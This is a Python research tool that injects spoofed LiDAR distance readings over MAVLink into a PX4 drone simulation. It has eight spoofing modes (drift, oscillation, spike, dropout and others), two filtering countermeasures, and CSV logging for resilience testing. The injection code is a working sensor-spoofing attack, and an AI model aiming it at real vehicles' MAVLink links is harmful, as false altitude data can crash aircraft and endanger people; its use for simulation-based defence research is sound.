#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
lidar_injector.py
====

LiDAR DISTANCE_SENSOR MAVLink injection tool for PX4 SITL.

This version includes optional software countermeasures for testing
LiDAR-attack resilience in SITL:

    --countermeasure none
    --countermeasure slew_gate
    --countermeasure robust_fallback

Countermeasure summary
----

1. slew_gate
   Rejects or clamps measurements that change faster than physically
   plausible. This targets spike, oscillation, drift and constant-style
   spoofing where the apparent ground distance changes abruptly or
   inconsistently.

2. robust_fallback
   Applies a rolling median filter and enters a temporary fallback/hold
   state if too many recent samples are invalid or inconsistent. This
   targets oscillation, spike, noisy and dropout-style attacks.

The script still generates the same attack modes as before:

    normal
    constant
    drift
    oscillation
    max_range
    dropout
    noisy
    spike
"""

from __future__ import annotations

import argparse
import csv
import math
import os
import random
import signal
import sys
import time
from collections import deque
from dataclasses import dataclass, field
from pathlib import Path
from statistics import median
from typing import Callable, Optional

os.environ.setdefault("MAVLINK20", "1")
os.environ.setdefault("MAVLINK_DIALECT", "common")

try:
    from pymavlink import mavutil
except ImportError:
    sys.stderr.write(
        "\033[91m[FATAL]\033[0m pymavlink is not installed.\n"
        "       Install with:  pip install pymavlink\n"
    )
    sys.exit(1)


class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    CY = "\033[96m"
    W = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    END = "\033[0m"


MIN_DISTANCE_CM = 5
MAX_DISTANCE_CM = 4000
SENSOR_TYPE = 0
SENSOR_ID = 0
SENSOR_ORIENTATION = 25
COVARIANCE_DEFAULT = 1
COVARIANCE_INVALID = 255

SPOOF_SYSID = 1
SPOOF_COMPID = 191


@dataclass
class AttackParams:
    true_altitude_m: float = 2.5
    constant_value_m: float = 0.5
    drift_rate_mps: float = 0.05
    osc_amp_m: float = 1.5
    osc_period_s: float = 2.0
    noise_sigma_m: float = 0.5
    spike_prob: float = 0.05
    seed: Optional[int] = None


@dataclass
class CountermeasureParams:
    mode: str = "none"

    # Used by slew_gate
    max_jump_m: float = 0.75
    max_rate_mps: float = 1.0
    clamp_instead_of_reject: bool = True

    # Used by robust_fallback
    window_size: int = 5
    residual_threshold_m: float = 0.75
    fault_threshold: int = 3
    hold_seconds: float = 2.0

    # Common
    min_quality: int = 20


@dataclass
class CountermeasureState:
    last_good_distance_m: Optional[float] = None
    last_good_time_s: Optional[float] = None
    last_output_distance_m: Optional[float] = None
    last_output_time_s: Optional[float] = None

    window_m: deque[float] = field(default_factory=deque)
    bad_count: int = 0
    fault_until_s: float = 0.0
    total_rejected: int = 0
    total_clamped: int = 0
    total_faults: int = 0


Generator = Callable[[float, AttackParams], tuple[int, int]]


def _banner(
    mode: str,
    duration: float,
    rate_hz: float,
    endpoint: str,
    countermeasure: str,
) -> None:
    print(f"{C.CY}{C.BOLD}" + "=" * 72 + f"{C.END}")
    print(f"{C.CY}{C.BOLD}  PX4 SITL LiDAR Injection Attack Toolkit{C.END}")
    print(f"{C.CY}{C.BOLD}" + "=" * 72 + f"{C.END}")
    print(f"  {C.W}mode          :{C.END} {C.Y}{mode}{C.END}")
    print(f"  {C.W}countermeasure:{C.END} {C.Y}{countermeasure}{C.END}")
    print(f"  {C.W}duration      :{C.END} {duration:.1f} s")
    print(f"  {C.W}rate          :{C.END} {rate_hz:.1f} Hz")
    print(f"  {C.W}endpoint      :{C.END} {endpoint}")
    print(
        f"  {C.W}sensor        :{C.END} Garmin LiDAR-Lite v3 "
        "(5 cm – 40 m, type=0 laser, orientation=25 down)"
    )
    print(f"{C.CY}" + "-" * 72 + f"{C.END}")


def _clamp_cm(value_cm: float) -> int:
    value = int(round(value_cm))
    if value < MIN_DISTANCE_CM:
        value = MIN_DISTANCE_CM
    if value > MAX_DISTANCE_CM:
        value = MAX_DISTANCE_CM
    return value


def _cm_to_m(distance_cm: int) -> Optional[float]:
    if distance_cm <= 0:
        return None
    if distance_cm < MIN_DISTANCE_CM:
        return None
    if distance_cm > MAX_DISTANCE_CM:
        return None
    return float(distance_cm) / 100.0


def _m_to_cm(distance_m: float) -> int:
    return _clamp_cm(distance_m * 100.0)


def gen_normal(t: float, p: AttackParams) -> tuple[int, int]:
    noise = random.gauss(0.0, 0.01)
    distance_m = p.true_altitude_m + noise
    return _clamp_cm(distance_m * 100.0), 100


def gen_constant(t: float, p: AttackParams) -> tuple[int, int]:
    return _clamp_cm(p.constant_value_m * 100.0), 100


def gen_drift(t: float, p: AttackParams) -> tuple[int, int]:
    distance_m = p.true_altitude_m + p.drift_rate_mps * t
    return _clamp_cm(distance_m * 100.0), 100


def gen_oscillation(t: float, p: AttackParams) -> tuple[int, int]:
    distance_m = p.true_altitude_m + p.osc_amp_m * math.sin(
        2.0 * math.pi * t / p.osc_period_s
    )
    return _clamp_cm(distance_m * 100.0), 100


def gen_max_range(t: float, p: AttackParams) -> tuple[int, int]:
    return MAX_DISTANCE_CM, 100


def gen_dropout(t: float, p: AttackParams) -> tuple[int, int]:
    return 0, 0


def gen_noisy(t: float, p: AttackParams) -> tuple[int, int]:
    distance_m = p.true_altitude_m + random.gauss(0.0, p.noise_sigma_m)
    return _clamp_cm(max(0.05, distance_m) * 100.0), 100


def gen_spike(t: float, p: AttackParams) -> tuple[int, int]:
    if random.random() < p.spike_prob:
        if random.random() < 0.5:
            return MAX_DISTANCE_CM, 100
        return 0, 0
    return gen_normal(t, p)


MODE_TABLE: dict[str, Generator] = {
    "normal": gen_normal,
    "constant": gen_constant,
    "drift": gen_drift,
    "oscillation": gen_oscillation,
    "max_range": gen_max_range,
    "dropout": gen_dropout,
    "noisy": gen_noisy,
    "spike": gen_spike,
}


class LidarCountermeasure:
    def __init__(self, params: CountermeasureParams) -> None:
        self.params = params
        self.state = CountermeasureState()
        self.state.window_m = deque(maxlen=max(1, params.window_size))

    def process(
        self,
        t_elapsed: float,
        raw_distance_cm: int,
        raw_quality: int,
    ) -> tuple[int, int, str]:
        if self.params.mode == "none":
            return raw_distance_cm, raw_quality, "none"

        if self.params.mode == "slew_gate":
            return self._process_slew_gate(
                t_elapsed,
                raw_distance_cm,
                raw_quality,
            )

        if self.params.mode == "robust_fallback":
            return self._process_robust_fallback(
                t_elapsed,
                raw_distance_cm,
                raw_quality,
            )

        raise ValueError(f"Unknown countermeasure mode: {self.params.mode}")

    def _process_slew_gate(
        self,
        t_elapsed: float,
        raw_distance_cm: int,
        raw_quality: int,
    ) -> tuple[int, int, str]:
        p = self.params
        s = self.state

        raw_distance_m = _cm_to_m(raw_distance_cm)

        if raw_quality < p.min_quality or raw_distance_m is None:
            s.total_rejected += 1
            if s.last_good_distance_m is not None:
                return _m_to_cm(s.last_good_distance_m), 50, "held_invalid"
            return 0, 0, "rejected_invalid"

        if s.last_good_distance_m is None or s.last_good_time_s is None:
            s.last_good_distance_m = raw_distance_m
            s.last_good_time_s = t_elapsed
            s.last_output_distance_m = raw_distance_m
            s.last_output_time_s = t_elapsed
            return raw_distance_cm, raw_quality, "accepted_initial"

        dt = max(1e-3, t_elapsed - s.last_good_time_s)
        jump_m = raw_distance_m - s.last_good_distance_m
        abs_jump_m = abs(jump_m)
        rate_mps = abs_jump_m / dt

        jump_bad = abs_jump_m > p.max_jump_m
        rate_bad = rate_mps > p.max_rate_mps

        if jump_bad or rate_bad:
            if p.clamp_instead_of_reject:
                allowed_delta = min(p.max_jump_m, p.max_rate_mps * dt)
                if jump_m > 0:
                    filtered_m = s.last_good_distance_m + allowed_delta
                else:
                    filtered_m = s.last_good_distance_m - allowed_delta

                filtered_m = max(
                    MIN_DISTANCE_CM / 100.0,
                    min(MAX_DISTANCE_CM / 100.0, filtered_m),
                )

                s.last_good_distance_m = filtered_m
                s.last_good_time_s = t_elapsed
                s.last_output_distance_m = filtered_m
                s.last_output_time_s = t_elapsed
                s.total_clamped += 1
                return _m_to_cm(filtered_m), 75, "clamped_slew"

            s.total_rejected += 1
            return _m_to_cm(s.last_good_distance_m), 50, "rejected_slew"

        s.last_good_distance_m = raw_distance_m
        s.last_good_time_s = t_elapsed
        s.last_output_distance_m = raw_distance_m
        s.last_output_time_s = t_elapsed
        return raw_distance_cm, raw_quality, "accepted"

    def _process_robust_fallback(
        self,
        t_elapsed: float,
        raw_distance_cm: int,
        raw_quality: int,
    ) -> tuple[int, int, str]:
        p = self.params
        s = self.state

        raw_distance_m = _cm_to_m(raw_distance_cm)
        currently_faulted = t_elapsed < s.fault_until_s

        if currently_faulted:
            if s.last_good_distance_m is not None:
                return _m_to_cm(s.last_good_distance_m), 40, "fallback_hold"
            return 0, 0, "fallback_invalid"

        invalid = raw_quality < p.min_quality or raw_distance_m is None

        if invalid:
            s.bad_count += 1
            s.total_rejected += 1
        else:
            if len(s.window_m) >= 3:
                med = median(s.window_m)
                residual = abs(raw_distance_m - med)
                if residual > p.residual_threshold_m:
                    s.bad_count += 1
                    s.total_rejected += 1
                    invalid = True
                else:
                    s.bad_count = max(0, s.bad_count - 1)
            else:
                s.bad_count = max(0, s.bad_count - 1)

        if s.bad_count >= p.fault_threshold:
            s.total_faults += 1
            s.fault_until_s = t_elapsed + p.hold_seconds
            s.bad_count = 0
            if s.last_good_distance_m is not None:
                return _m_to_cm(s.last_good_distance_m), 30, "fault_latch_hold"
            return 0, 0, "fault_latch_invalid"

        if invalid:
            if s.last_good_distance_m is not None:
                return _m_to_cm(s.last_good_distance_m), 45, "held_outlier"
            return 0, 0, "rejected_no_history"

        assert raw_distance_m is not None

        s.window_m.append(raw_distance_m)
        filtered_m = median(s.window_m)

        s.last_good_distance_m = filtered_m
        s.last_good_time_s = t_elapsed
        s.last_output_distance_m = filtered_m
        s.last_output_time_s = t_elapsed

        return _m_to_cm(filtered_m), raw_quality, "median_filtered"


class LidarInjector:
    def __init__(
        self,
        endpoint: str,
        mode: str,
        rate_hz: float,
        duration: float,
        params: AttackParams,
        countermeasure_params: CountermeasureParams,
        log_path: Optional[Path] = None,
    ) -> None:
        if mode not in MODE_TABLE:
            raise ValueError(
                f"Unknown mode '{mode}'. Choose from: {list(MODE_TABLE)}"
            )

        self.endpoint = endpoint
        self.mode = mode
        self.rate_hz = float(rate_hz)
        self.period = 1.0 / self.rate_hz
        self.duration = float(duration)
        self.params = params
        self.countermeasure_params = countermeasure_params
        self.countermeasure = LidarCountermeasure(countermeasure_params)
        self.generator: Generator = MODE_TABLE[mode]
        self._stop = False
        self._master: Optional[mavutil.mavfile] = None

        if log_path is None:
            log_dir = Path(__file__).resolve().parent / "logs"
            log_dir.mkdir(parents=True, exist_ok=True)
            stamp = time.strftime("%Y%m%d_%H%M%S")
            log_path = log_dir / (
                f"injector_{stamp}_{mode}_{countermeasure_params.mode}.csv"
            )

        self.log_path = Path(log_path)
        self._log_fh = self.log_path.open("w", newline="")
        self._log = csv.writer(self._log_fh)
        self._log.writerow(
            [
                "wall_time_iso",
                "monotonic_s",
                "t_elapsed_s",
                "mode",
                "countermeasure",
                "raw_distance_cm",
                "raw_distance_m",
                "raw_signal_quality",
                "filtered_distance_cm",
                "filtered_distance_m",
                "filtered_signal_quality",
                "covariance",
                "countermeasure_action",
                "min_cm",
                "max_cm",
            ]
        )

    def _connect(self) -> None:
        print(f"{C.B}[*]{C.END} opening MAVLink endpoint {self.endpoint} …")
        self._master = mavutil.mavlink_connection(
            self.endpoint,
            source_system=SPOOF_SYSID,
            source_component=SPOOF_COMPID,
            input=False,
        )
        print(
            f"{C.G}[+]{C.END} MAVLink connection opened "
            f"(sysid={SPOOF_SYSID}, compid={SPOOF_COMPID})."
        )

    def _send_one(self, t_elapsed: float) -> tuple[int, int, int, int, int, str]:
        raw_distance_cm, raw_quality = self.generator(t_elapsed, self.params)

        filtered_distance_cm, filtered_quality, action = self.countermeasure.process(
            t_elapsed,
            raw_distance_cm,
            raw_quality,
        )

        covariance = (
            COVARIANCE_INVALID
            if filtered_quality == 0 or filtered_distance_cm <= 0
            else COVARIANCE_DEFAULT
        )

        assert self._master is not None
        time_boot_ms = int(t_elapsed * 1000.0) & 0xFFFF

        try:
            self._master.mav.distance_sensor_send(
                time_boot_ms,
                MIN_DISTANCE_CM,
                MAX_DISTANCE_CM,
                filtered_distance_cm,
                SENSOR_TYPE,
                SENSOR_ID,
                SENSOR_ORIENTATION,
                covariance,
                horizontal_fov=0.0,
                vertical_fov=0.0,
                quaternion=[0.0, 0.0, 0.0, 0.0],
                signal_quality=filtered_quality,
            )
        except TypeError:
            if not getattr(self, "_warned_extended", False):
                print(
                    f"{C.Y}[!]{C.END} pymavlink build lacks extended "
                    "DISTANCE_SENSOR fields — falling back to legacy "
                    "signature."
                )
                self._warned_extended = True
            self._master.mav.distance_sensor_send(
                time_boot_ms,
                MIN_DISTANCE_CM,
                MAX_DISTANCE_CM,
                filtered_distance_cm,
                SENSOR_TYPE,
                SENSOR_ID,
                SENSOR_ORIENTATION,
                covariance,
            )

        return (
            raw_distance_cm,
            raw_quality,
            filtered_distance_cm,
            filtered_quality,
            covariance,
            action,
        )

    def run(self) -> None:
        self._connect()

        signal.signal(signal.SIGINT, self._on_signal)
        signal.signal(signal.SIGTERM, self._on_signal)

        start_mono = time.monotonic()
        next_tick = start_mono
        sample_count = 0
        last_print = start_mono

        print(
            f"{C.M}[>] injecting '{self.mode}' "
            f"with countermeasure '{self.countermeasure_params.mode}' "
            f"@ {self.rate_hz:.1f} Hz for {self.duration:.1f}s … "
            f"(Ctrl+C to abort){C.END}"
        )

        try:
            while not self._stop:
                now = time.monotonic()
                t_elapsed = now - start_mono
                if t_elapsed >= self.duration:
                    break

                (
                    raw_distance_cm,
                    raw_quality,
                    filtered_distance_cm,
                    filtered_quality,
                    covariance,
                    action,
                ) = self._send_one(t_elapsed)

                self._log.writerow(
                    [
                        time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime())
                        + f".{int((time.time() % 1) * 1e6):06d}",
                        f"{now:.6f}",
                        f"{t_elapsed:.6f}",
                        self.mode,
                        self.countermeasure_params.mode,
                        raw_distance_cm,
                        (
                            ""
                            if raw_distance_cm <= 0
                            else f"{raw_distance_cm / 100.0:.4f}"
                        ),
                        raw_quality,
                        filtered_distance_cm,
                        (
                            ""
                            if filtered_distance_cm <= 0
                            else f"{filtered_distance_cm / 100.0:.4f}"
                        ),
                        filtered_quality,
                        covariance,
                        action,
                        MIN_DISTANCE_CM,
                        MAX_DISTANCE_CM,
                    ]
                )

                sample_count += 1

                if now - last_print >= 1.0:
                    last_print = now
                    print(
                        f"  {C.DIM}t={t_elapsed:6.2f}s{C.END}  "
                        f"{C.Y}{self.mode:<11}{C.END}  "
                        f"raw={C.W}{raw_distance_cm / 100.0:6.2f} m{C.END}  "
                        f"out={C.CY}{filtered_distance_cm / 100.0:6.2f} m{C.END}  "
                        f"q={filtered_quality:>3d}  "
                        f"action={action:<18}  "
                        f"sent={sample_count}"
                    )

                next_tick += self.period
                delay = next_tick - time.monotonic()
                if delay > 0:
                    time.sleep(delay)
                else:
                    next_tick = time.monotonic()

        finally:
            self._shutdown(sample_count, time.monotonic() - start_mono)

    def _on_signal(self, signum, _frame):
        print(f"\n{C.Y}[!]{C.END} signal {signum} received — stopping.")
        self._stop = True

    def _shutdown(self, samples: int, elapsed: float) -> None:
        try:
            self._log_fh.flush()
            self._log_fh.close()
        except Exception:
            pass

        try:
            if self._master is not None:
                self._master.close()
        except Exception:
            pass

        state = self.countermeasure.state
        rate = samples / elapsed if elapsed > 0 else 0.0

        print(
            f"{C.G}[✓]{C.END} injection finished: "
            f"{samples} samples in {elapsed:.2f}s "
            f"({rate:.1f} Hz effective)"
        )
        print(f"{C.G}[✓]{C.END} log written to {self.log_path}")

        if self.countermeasure_params.mode != "none":
            print(
                f"{C.CY}[i]{C.END} countermeasure summary: "
                f"rejected={state.total_rejected}, "
                f"clamped={state.total_clamped}, "
                f"faults={state.total_faults}"
            )


def _parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="lidar_injector",
        description=(
            "Inject spoofed DISTANCE_SENSOR MAVLink messages into PX4 SITL "
            "with optional software countermeasures."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  ./lidar_injector.py --mode normal --duration 30\n\n"
            "  ./lidar_injector.py --mode drift --duration 60 "
            "--countermeasure slew_gate --max-rate-mps 0.4\n\n"
            "  ./lidar_injector.py --mode oscillation --duration 60 "
            "--countermeasure robust_fallback --window-size 5\n\n"
            "  ./lidar_injector.py --mode spike --duration 60 "
            "--countermeasure robust_fallback --fault-threshold 2\n"
        ),
    )

    parser.add_argument(
        "--mode",
        required=True,
        choices=list(MODE_TABLE),
        help="Attack mode to run.",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=30.0,
        help="Run duration in seconds, default: 30.",
    )
    parser.add_argument(
        "--rate",
        type=float,
        default=50.0,
        help="Publication rate in Hz, default: 50.",
    )
    parser.add_argument(
        "--endpoint",
        default="udpout:127.0.0.1:14580",
        help="pymavlink endpoint, default: udpout:127.0.0.1:14580.",
    )
    parser.add_argument(
        "--log",
        default=None,
        help="CSV log path.",
    )

    # Attack parameters
    parser.add_argument(
        "--true-alt",
        type=float,
        default=2.5,
        help="Assumed true hover altitude in metres, default: 2.5.",
    )
    parser.add_argument(
        "--constant-value",
        type=float,
        default=0.5,
        help="Fixed distance for constant mode, metres, default: 0.5.",
    )
    parser.add_argument(
        "--drift-rate",
        type=float,
        default=0.05,
        help="Drift rate for drift mode in m/s. Negative = descend.",
    )
    parser.add_argument(
        "--osc-amp",
        type=float,
        default=1.5,
        help="Oscillation amplitude in metres, default: 1.5.",
    )
    parser.add_argument(
        "--osc-period",
        type=float,
        default=2.0,
        help="Oscillation period in seconds, default: 2.0.",
    )
    parser.add_argument(
        "--noise-sigma",
        type=float,
        default=0.5,
        help="Gaussian noise sigma in metres, default: 0.5.",
    )
    parser.add_argument(
        "--spike-prob",
        type=float,
        default=0.05,
        help="Per-sample spike probability, default: 0.05.",
    )
    parser.add_argument(
        "--seed",
        type=int,
        default=None,
        help="Random seed for reproducibility.",
    )

    # Countermeasure parameters
    parser.add_argument(
        "--countermeasure",
        choices=["none", "slew_gate", "robust_fallback"],
        default="none",
        help="Countermeasure mode to apply before publishing sensor data.",
    )
    parser.add_argument(
        "--max-jump-m",
        type=float,
        default=0.75,
        help="Slew gate max allowed sample-to-sample jump in metres.",
    )
    parser.add_argument(
        "--max-rate-mps",
        type=float,
        default=1.0,
        help="Slew gate max allowed range-rate in m/s.",
    )
    parser.add_argument(
        "--reject-instead-of-clamp",
        action="store_true",
        help="For slew_gate, reject bad samples instead of clamping them.",
    )
    parser.add_argument(
        "--window-size",
        type=int,
        default=5,
        help="Rolling window size for robust_fallback.",
    )
    parser.add_argument(
        "--residual-threshold-m",
        type=float,
        default=0.75,
        help="Outlier threshold from rolling median in metres.",
    )
    parser.add_argument(
        "--fault-threshold",
        type=int,
        default=3,
        help="Number of consecutive bad samples before fault latch.",
    )
    parser.add_argument(
        "--hold-seconds",
        type=float,
        default=2.0,
        help="Fallback hold duration after fault latch.",
    )
    parser.add_argument(
        "--min-quality",
        type=int,
        default=20,
        help="Minimum accepted signal quality.",
    )

    return parser.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = _parse_args(argv)

    if args.seed is not None:
        random.seed(args.seed)

    attack_params = AttackParams(
        true_altitude_m=args.true_alt,
        constant_value_m=args.constant_value,
        drift_rate_mps=args.drift_rate,
        osc_amp_m=args.osc_amp,
        osc_period_s=args.osc_period,
        noise_sigma_m=args.noise_sigma,
        spike_prob=args.spike_prob,
        seed=args.seed,
    )

    countermeasure_params = CountermeasureParams(
        mode=args.countermeasure,
        max_jump_m=args.max_jump_m,
        max_rate_mps=args.max_rate_mps,
        clamp_instead_of_reject=not args.reject_instead_of_clamp,
        window_size=args.window_size,
        residual_threshold_m=args.residual_threshold_m,
        fault_threshold=args.fault_threshold,
        hold_seconds=args.hold_seconds,
        min_quality=args.min_quality,
    )

    _banner(
        args.mode,
        args.duration,
        args.rate,
        args.endpoint,
        args.countermeasure,
    )

    injector = LidarInjector(
        endpoint=args.endpoint,
        mode=args.mode,
        rate_hz=args.rate,
        duration=args.duration,
        params=attack_params,
        countermeasure_params=countermeasure_params,
        log_path=Path(args.log) if args.log else None,
    )

    try:
        injector.run()
    except Exception as exc:
        print(f"{C.R}[FATAL]{C.END} {type(exc).__name__}: {exc}")
        return 2

    return 0


if __name__ == "__main__":
    sys.exit(main())
